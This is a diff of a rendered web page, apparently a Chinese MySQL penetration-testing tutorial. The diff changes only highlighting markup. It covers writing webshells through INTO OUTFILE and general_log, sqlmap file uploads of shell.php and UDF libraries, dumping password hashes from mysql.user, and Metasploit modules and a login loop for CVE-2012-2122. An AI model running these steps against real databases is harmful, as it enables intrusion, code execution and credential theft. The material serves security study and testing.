@@ -218,13 +218,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%secure_file_priv%&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w"> </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">secure_file_priv</span><span class="w"> </span><span class="o">|</span><span class="w">       </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%secure_file_priv%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">secure_file_priv</span><span class="w"> </span><span class="o">|</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
@@ -237,8 +237,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/www/html/info.php&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/www/html/info.php&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>sqlmap 下可以执行如下操作：</p>
 <div class="highlight"><div class="chroma">
@@ -246,8 +246,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">&#34;http://x.x.x.x/?id=x&#34;</span> --file-write<span class="o">=</span><span class="s2">&#34;/path/to/shell.php&#34;</span> --file-dest<span class="o">=</span><span class="s2">&#34;/var/www/html/test/shell.php&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://x.x.x.x/?id=x&#34;</span> --file-write<span class="o">=</span><span class="s2">&#34;/path/to/shell.php&#34;</span> --file-dest<span class="o">=</span><span class="s2">&#34;/var/www/html/test/shell.php&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
 <h4 id="122-terminated-by-写文件">1.2.2 terminated by 写文件</h4>
@@ -256,8 +256,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="123-general-log-写文件">1.2.3 general log 写文件</h4>
 <p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
@@ -280,14 +280,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                           </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">OFF</span><span class="w">                             </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">c1595d3a029a</span><span class="p">.</span><span class="n">log</span><span class="w"> </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">OFF</span><span class="w">                             </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">c1595d3a029a</span><span class="p">.</span><span class="n">log</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>通过将 <code>general_log</code> 存储位置改为 web 目录。同时，向日志文件里面写入内容的话，那么就可以成功 getshell。</p>
 <div class="highlight"><div class="chroma">
@@ -309,22 +309,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># 更改日志文件位置
-</span><span class="c1"></span><span class="kt">set</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;ON&#34;</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="kt">set</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="o">=</span><span class="s1">&#39;/var/www/html/info.php&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="c1"># 查看当前配置
-</span><span class="c1"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                       </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">ON</span><span class="w">                          </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="w">     </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="c1"># 往日志里面写入 payload
-</span><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># 更改日志文件位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">set</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;ON&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">set</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="o">=</span><span class="s1">&#39;/var/www/html/info.php&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 查看当前配置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">ON</span><span class="w">                          </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 往日志里面写入 payload
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><div class="details admonition warning open">
         <div class="details-summary admonition-title">
@@ -337,8 +337,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">-rw-rw---- 1 mysql mysql 293 Feb 19 10:29 shell.php
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-rw-rw---- 1 mysql mysql 293 Feb 19 10:29 shell.php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>访问这个 php 文件会出现 HTTP 500 的状态码，结论是 Linux 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些。</p>
 </div>
@@ -355,12 +355,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="w"> </span><span class="err">版本</span><span class="w">
-</span><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="w"> </span><span class="err">版本</span><span class="w">
-</span><span class="w"></span><span class="n">mysql</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="k">user</span><span class="p">,</span><span class="n">authentication_string</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="w"> </span><span class="err">版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="w"> </span><span class="err">版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="k">user</span><span class="p">,</span><span class="n">authentication_string</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -380,9 +380,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello
-msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello
+</span></span><span class="line"><span class="cl">msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="142-cve-2012-2122">1.4.2 CVE-2012-2122</h4>
 <p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：</p>
@@ -391,8 +391,8 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 1000<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> mysql -uroot -pwrong -h 127.0.0.1 -P3306 <span class="p">;</span> <span class="k">done</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 1000<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> mysql -uroot -pwrong -h 127.0.0.1 -P3306 <span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 MSF 中有对应的利用模块：</p>
 <div class="highlight"><div class="chroma">
@@ -400,8 +400,8 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -447,13 +447,13 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
-</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                        </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
-</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">plugin_dir</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">plugin</span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                        </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">plugin_dir</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">plugin</span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><div class="details admonition tip open">
         <div class="details-summary admonition-title">
@@ -481,13 +481,13 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="o">+</span><span class="c1">------------------+
-</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="w">        </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+</span><span class="c1">------------------+
-</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">mysql</span><span class="w"> </span><span class="o">|</span><span class="w">
-</span><span class="w"></span><span class="o">+</span><span class="c1">------------------+
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="w">        </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">mysql</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
         </div>
@@ -499,8 +499,8 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">&#34;http://localhost/&#34;</span> --data<span class="o">=</span><span class="s2">&#34;id=1&#34;</span> --file-write<span class="o">=</span><span class="s2">&#34;/path/to/lib_mysqludf_sys_64.so&#34;</span> --file-dest<span class="o">=</span><span class="s2">&#34;/usr/lib/mysql/plugin/udf.so&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://localhost/&#34;</span> --data<span class="o">=</span><span class="s2">&#34;id=1&#34;</span> --file-write<span class="o">=</span><span class="s2">&#34;/path/to/lib_mysqludf_sys_64.so&#34;</span> --file-dest<span class="o">=</span><span class="s2">&#34;/usr/lib/mysql/plugin/udf.so&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，可以通过手工写文件到 plugin 目录下的：</p>
 <div class="highlight"><div class="chroma">
@@ -509,9 +509,9 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span><span class="w"> </span><span class="err">直接</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="err">查询十六进制写入</span><span class="w">
-</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="mi">0</span><span class="n">x7f454c4602</span><span class="p">...</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">DUMPFILE</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/udf.so&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">直接</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="err">查询十六进制写入</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="mi">0</span><span class="n">x7f454c4602</span><span class="p">...</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">DUMPFILE</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/udf.so&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：</p>
 <div class="highlight"><div class="chroma">
@@ -523,12 +523,12 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span><span class="w"> </span><span class="err">直接传入路径编码</span><span class="w">
-</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/lib_mysqludf_sys_64.so&#39;</span><span class="p">));</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">也可以将路径</span><span class="w"> </span><span class="n">hex</span><span class="w"> </span><span class="err">编码</span><span class="w">
-</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="mi">0</span><span class="n">x2f6c69625f6d7973716c7564665f7379735f36342e736f</span><span class="p">));</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">直接传入路径编码</span><span class="w">
